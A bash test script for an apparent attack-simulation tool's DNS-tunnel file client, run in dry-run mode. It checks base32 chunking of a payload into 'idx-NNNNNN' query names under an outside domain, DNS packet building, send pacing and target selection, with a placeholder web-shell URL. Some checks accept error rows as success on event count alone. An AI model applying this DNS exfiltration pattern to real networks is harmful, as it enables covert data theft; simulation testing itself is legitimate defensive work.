#!/usr/bin/env bash
# DNS Tunnel File Client — payload, packet, target selection, duration validation
set -Eeuo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "${ROOT}"

failures=0
pass() { printf '[PASS] %s\n' "$1"; }
fail() { printf '[FAIL] %s\n' "$1"; failures=$((failures + 1)); }

export LOCAL_STATE_DIR="${TMPDIR:-/tmp}/poc_dns_tunnel_file_client_test_$$"
mkdir -p "${LOCAL_STATE_DIR}/remote_hosts"
export DRY_RUN=true
export WEB_SHELL_URL="http://127.0.0.1/shell.jsp"
export TARGET_NET="10.0.0.0/24"
export NETWORK_PREFIX="10.0.0"
export CAMPAIGN_ID="dns-tunnel-file-client-test"
export POC_RUN_ID="dns-tunnel-file-client-test"
export EFFECTIVE_REPORT_DIR="${LOCAL_STATE_DIR}/report"
export LOG_DIR="${LOCAL_STATE_DIR}/logs"
export REPORT_DIR="${LOCAL_STATE_DIR}/report"
export DNS_TUNNEL_SIM_DOMAIN="dns-tunnel.com"
export DNS_TUNNEL_PAYLOAD_MB=2
export DNS_TUNNEL_CHUNK_SIZE=30
export DNS_TUNNEL_DURATION_SEC=180
export DNS_TUNNEL_MAX_SENT_CAP=5000

printf '10.0.0.10\n10.0.0.20\n10.0.0.30\n' > "${LOCAL_STATE_DIR}/remote_hosts/alive_hosts.txt"

# shellcheck disable=SC1091
source "${ROOT}/stellar_poc.sh"

LOCAL_STATE_DIR="${TMPDIR:-/tmp}/poc_dns_tunnel_file_client_test_$$"
POC_RUN_ID="dns-tunnel-file-client-test"
LOG_DIR="${LOCAL_STATE_DIR}/logs"
REPORT_DIR="${LOCAL_STATE_DIR}/report"
EFFECTIVE_REPORT_DIR="${LOCAL_STATE_DIR}/report"
DRY_RUN=true
mkdir -p "${LOCAL_STATE_DIR}" "${LOG_DIR}"

if python3 -m py_compile "${ROOT}/stellar_dns_tunnel_file_client.py" 2>/dev/null; then
    pass "stellar_dns_tunnel_file_client.py syntax OK"
else
    fail "stellar_dns_tunnel_file_client.py syntax error"
fi

planned=$(python3 -c "
from stellar_dns_tunnel_file_client import plan_idx_count
print(plan_idx_count(2, 30))
" 2>/dev/null || echo 0)
planned=$(safe_int "${planned}")
if (( planned >= 69904 && planned <= 69908 )); then
    pass "2MB/30B plan yields ${planned} idx chunks (~69906)"
else
    fail "planned chunk count ${planned} expected ~69906 (69904-69908)"
fi

if python3 -c "
from stellar_dns_tunnel_file_client import clamp_duration_sec
assert clamp_duration_sec(180) == 180
assert clamp_duration_sec(60) == 120
assert clamp_duration_sec(300) == 240
" 2>/dev/null; then
    pass "duration_sec clamped to 120..240"
else
    fail "clamp_duration_sec out of expected range"
fi

sleep_iv=$(python3 -c "
from stellar_dns_tunnel_file_client import compute_sleep_interval, plan_idx_count
n=plan_idx_count(2, 30)
print(f'{compute_sleep_interval(n, 180):.6f}')
" 2>/dev/null || echo 0)
if python3 -c "
from stellar_dns_tunnel_file_client import compute_sleep_interval, plan_idx_count, SLEEP_MIN, SLEEP_MAX
n=plan_idx_count(2, 30)
iv=compute_sleep_interval(n, 180)
assert SLEEP_MIN <= iv <= SLEEP_MAX
assert 0.002 <= iv <= 0.003
" 2>/dev/null; then
    pass "3min duration sleep_interval=${sleep_iv} (clamped 0.002~0.02)"
else
    fail "sleep_interval ${sleep_iv} out of expected range"
fi

if python3 -c "
from stellar_dns_tunnel_file_client import build_dns_query, chunk_to_b32_label, encode_qname
import os
chunk=os.urandom(30)
b32=chunk_to_b32_label(chunk)
fqdn=f'idx-000001-{b32}.dns-tunnel.com'
assert fqdn.startswith('idx-000001-')
txn, pkt=build_dns_query(fqdn)
assert len(pkt) > 12
assert encode_qname(fqdn)
" 2>/dev/null; then
    pass "2MB chunk base32 idx-000001 pattern and DNS query packet OK"
else
    fail "payload/packet generation failed"
fi

if [[ -f "$(net_sim_dns_tunnel_script_path)" ]]; then
    pass "dns tunnel file client script present"
else
    fail "stellar_dns_tunnel_file_client.py missing"
fi

if select_dns_tunnel_file_targets; then
    count=$(safe_int "${DNS_TUNNEL_FILE_TARGET_COUNT}")
    if (( count == 2 )) && [[ "${DNS_TUNNEL_FILE_TARGETS}" == *10.0.0.10* ]] && [[ "${DNS_TUNNEL_FILE_TARGETS}" == *10.0.0.20* ]]; then
        pass "select_dns_tunnel_file_targets picked 2 alive hosts: ${DNS_TUNNEL_FILE_TARGETS}"
    else
        fail "target selection expected 2 hosts got count=${count} targets=${DNS_TUNNEL_FILE_TARGETS}"
    fi
else
    fail "select_dns_tunnel_file_targets failed"
fi

init_event_store
out=$(run_dns_tunnel_simulator_local "${DNS_TUNNEL_FILE_TARGETS}" "${CAMPAIGN_ID}" "dry_run_sot")
for marker in \
    DNS_TUNNEL_START \
    DNS_TUNNEL_TARGET_SELECTED \
    DNS_QUERY_SENT \
    DNS_QUERY_RESPONSE \
    DNS_EVENT_WRITTEN \
    DNS_TUNNEL_EXECUTION_SUMMARY \
    DNS_TUNNEL_FILE_CLIENT_START \
    DNS_TUNNEL_PACKET_EVIDENCE \
    DNS_TUNNEL_FILE_CLIENT_PROGRESS \
    DNS_TUNNEL_FILE_CLIENT_DONE \
    DNS_TUNNEL_FILE_CLIENT_SUMMARY; do
    if [[ "${out}" == *"${marker}"* ]]; then
        pass "stdout contains ${marker}"
    else
        fail "missing ${marker} in stdout"
    fi
done
if [[ "${out}" == *idx-000001-* ]]; then
    pass "stdout contains sample idx-000001 fqdn evidence"
else
    fail "missing idx-000001 sample fqdn in stdout"
fi
if [[ "${out}" != *port*53*open* ]] && [[ "${out}" != *validate_dns* ]] && [[ "${out}" != *DNS_VISIBILITY* ]]; then
    pass "no port-53/resolver/visibility validation in output"
else
    fail "unexpected port-53/resolver/visibility validation in output"
fi

net_sim_dns_tunnel_dry_run_events 0
dns_tunnel_emit_event_file_check 2>/dev/null || true
dns_tunnel_emit_event_count 2>/dev/null || true
dns_sum=$(build_module_summary_from_events "DNS_TUNNEL")
sent=$(safe_int "$(event_summary_field "${dns_sum}" sent 0)")
avg_pl=$(safe_int "$(event_summary_field "${dns_sum}" avg_label_length 0)")
idx_cnt=$(safe_int "$(event_summary_field "${dns_sum}" idx_pattern_count 0)")
sendto_ok=$(safe_int "$(event_summary_field "${dns_sum}" sendto_success 0)")
target_count=$(safe_int "$(event_summary_field "${dns_sum}" target_count 0)")
bytes_enc=$(safe_int "$(event_summary_field "${dns_sum}" bytes_encoded 0)")
idx_queries=$(( sent - target_count * 2 ))
(( idx_queries < 1 )) && idx_queries="${sent}"
idx_min=$(( idx_queries * 80 / 100 ))

if (( sent >= 5000 )); then
    pass "dry-run SOT sent=${sent} (>=5000 capped)"
else
    fail "dry-run SOT sent=${sent} expected >=5000"
fi
if (( avg_pl >= 40 )); then
    pass "avg_label_length=${avg_pl} (>=40)"
else
    fail "avg_label_length=${avg_pl} expected >=40"
fi
if (( idx_cnt >= idx_min )); then
    pass "idx_pattern_count=${idx_cnt} >=80% of idx_queries=${idx_queries} (min=${idx_min})"
else
    fail "idx_cnt=${idx_cnt} below 80% threshold min=${idx_min} idx_queries=${idx_queries}"
fi
if (( sendto_ok > 0 )); then
    pass "sendto_success=${sendto_ok} (>0)"
else
    fail "sendto_success=${sendto_ok} expected >0"
fi

stage_rows=$(awk -F'\t' 'NR>1 && $4=="dns_tunnel_file_client"' "${EVENT_DNS_EVENTS}" 2>/dev/null | wc -l | awk '{print $1}')
if (( stage_rows > 0 )); then
    pass "events use stage=dns_tunnel_file_client (${stage_rows} rows)"
else
    fail "no dns_tunnel_file_client stage rows in dns_events.tsv"
fi

event_apply_module_validation "DNS_TUNNEL" "dns_tunnel_file_client"
case "${EVENT_MODULE_DECISION[DNS_TUNNEL]:-}" in
    success) pass "DNS_TUNNEL decision=${EVENT_MODULE_DECISION[DNS_TUNNEL]:-} (event_count-based)" ;;
    *) fail "expected success got ${EVENT_MODULE_DECISION[DNS_TUNNEL]:-} reason=${EVENT_MODULE_FAILURE_REASON[DNS_TUNNEL]:-}" ;;
esac
ev_count=$(event_module_event_count "DNS_TUNNEL")
if (( ev_count > 0 )); then
    pass "success decision requires event_count>0 (event_count=${ev_count})"
else
    fail "event_count=${ev_count} expected >0"
fi

# event_count-only rows without live query markers still validate as success (event SOT)
init_event_store
i=0
while (( i < 2000 )); do
    i=$((i + 1))
    printf '%s\t%s\tDNS_TUNNEL\tdns_tunnel_file_client\t10.0.0.10\tquery\tfqdn\terror\t0\tidx-%06d-fake.dns-tunnel.com|A|sess|1|48|30\tdry_run\n' \
        "$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || date +%s)" "${CAMPAIGN_ID}" "${i}" >> "${EVENT_DNS_EVENTS}"
done
event_stage_mark_executed "DNS_TUNNEL" "dns_tunnel_file_client"
ev_only_sum=$(build_module_summary_from_events "DNS_TUNNEL")
read -r ev_only_dec ev_only_reason <<< "$(validate_module_from_summary "DNS_TUNNEL" "${ev_only_sum}" "dns_tunnel_file_client")"
if [[ "${ev_only_dec}" == success ]]; then
    pass "event_count-only rows accepted (${ev_only_reason})"
else
    fail "event_count-only should succeed got dec=${ev_only_dec} reason=${ev_only_reason}"
fi

# bulk SOT rows validate success via event_count
init_event_store
{
    j=0
    while (( j < 30002 )); do
        j=$((j + 1))
        fqdn="$(printf 'idx-%06d-JBSWY3DPFQQHO33SJBSWY3DPFQQHO33SJBSWY3DPFQ%03d.dns-tunnel.com' "${j}" "${j}")"
        printf '%s\t%s\tDNS_TUNNEL\tdns_tunnel_file_client\t10.0.0.10\tquery\tfqdn\tsent\t0\t%s|A|sess|%s|48|30\tdry_run\n' \
            "2026-06-04T00:00:00Z" "${CAMPAIGN_ID}" "${fqdn}" "${j}"
    done
} >> "${EVENT_DNS_EVENTS}"
sendto_sum=$(build_module_summary_from_events "DNS_TUNNEL")
DNS_TUNNEL_FILE_CLIENT_DURATION_SEC=0
read -r sendto_dec sendto_reason <<< "$(validate_module_from_summary "DNS_TUNNEL" "${sendto_sum}" "dns_tunnel_file_client")"
if [[ "${sendto_dec}" == success && "${sendto_reason}" == *event_count* ]]; then
    pass "event_count success path (${sendto_reason})"
else
    fail "expected event_count success got dec=${sendto_dec} reason=${sendto_reason}"
fi

if (( failures == 0 )); then
    printf '\nAll DNS Tunnel File Client tests passed.\n'
    exit 0
fi
printf '\n%d test(s) failed.\n' "${failures}"
exit 1
